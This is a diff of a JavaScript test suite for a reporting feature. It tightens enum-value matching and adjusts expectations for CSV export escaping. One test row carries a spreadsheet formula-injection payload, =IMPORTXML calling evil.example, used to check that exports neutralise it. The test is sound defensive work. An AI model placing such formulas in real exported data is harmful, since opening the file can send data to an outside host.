@@ -572,10 +572,12 @@ test('governed reports query real PostgreSQL, save, export, schedule and isolate
           filters:[{field:'status',operator:'equals',value:'act'}],
           sort:'sku',direction:'asc',chart:'table'}};
       }}});
-    assert.equal(canonicalCategory.status,'ANSWERED');
-    assert.equal(canonicalCategory.rows.length,1);
-    assert.equal(canonicalCategory.reportConfig.filters[0].value,'active');
-    assert.match(canonicalCategory.answer,/only recorded category/);
+    assert.equal(canonicalCategory.status,'CLARIFY','An invented enum fragment must never silently select a different state');
+    assert.equal(canonicalCategory.rows.length,0);
+    assert.match(canonicalCategory.answer,/active.*inactive/);
+    const exactCategory=await reports.run(database,ctx,actor,{dataset:'catalogue',columns:['product','sku','status'],filters:[{field:'status',operator:'equals',value:'active'}],sort:'sku'});
+    assert.equal(exactCategory.rows.length,1);
+    assert.equal(exactCategory.rows[0].status,'active');
     assert.throws(()=>reports.normalize({dataset:'payments',groups:['status'],aggregate:'sum',
       measure:'amount_minor',sort:'total'},actor),/currency/i);
     const askPage=await owner.get('/ask');
@@ -823,7 +825,7 @@ test('governed reports query real PostgreSQL, save, export, schedule and isolate
     assert.ok(reportExports.csv(stock).toString().includes('Copper Clamp'));
     const unsafe={...stock,rows:[{product:'=IMPORTXML("https://evil.example", "//x")'}],
       displayRows:[{product:'=IMPORTXML("https://evil.example", "//x")'}],columns:['product']};
-    assert.match(reportExports.csv(unsafe).toString(),/^"product"\r\n"'=IMPORTXML/);
+    assert.match(reportExports.csv(unsafe).toString(),/^"Product"\r\n"'=IMPORTXML/);
     const accented=await reportExports.pdf({...unsafe,config:{title:'Caf\u00e9'}});
     assert.match(accented.toString('ascii'),/^%PDF-1\.[3-7]/);
     await assert.rejects(()=>reportExports.pdf({...unsafe,config:{title:'\u4e2d\u6587'}}),
